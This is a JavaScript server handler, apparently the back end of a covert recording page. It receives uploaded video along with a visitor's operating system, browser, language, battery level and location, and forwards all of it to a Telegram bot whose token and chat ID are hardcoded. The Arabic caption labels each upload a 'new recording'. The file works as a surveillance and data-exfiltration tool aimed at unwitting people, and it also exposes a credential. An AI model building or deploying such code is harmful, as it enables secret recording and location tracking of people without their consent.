import formidable from 'formidable';
import fs from 'fs';

export const config = {
  api: {
    bodyParser: false,
  },
};

const BOT_TOKEN = "7701585433:AAFKP5UDdVsxRL2zrbmlaIK2jzd30rPW-F0";
const CHAT_ID = "8141222239";

export default async function handler(req, res) {
  const form = new formidable.IncomingForm();
  form.uploadDir = "/tmp";
  form.keepExtensions = true;

  form.parse(req, async (err, fields, files) => {
    if (err) return res.status(500).send("Error parsing form");

    const videoPath = files.video.filepath;
    const info = JSON.parse(fields.info);

    const caption = `
📹 تسجيل جديد:

🖥️ نظام: ${info.platform}
🌐 متصفح: ${info.userAgent}
🗣️ لغة: ${info.language}
🔋 بطارية: ${info.battery}
📍 موقع: ${info.location}
`;

    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("caption", caption);
    formData.append("video", fs.createReadStream(videoPath));

    const response = await fetch(telegramURL, {
      method: "POST",
      body: formData
    });

    if (!response.ok) return res.status(500).send("Failed to send to Telegram");
    res.status(200).send("Sent successfully");
  });
}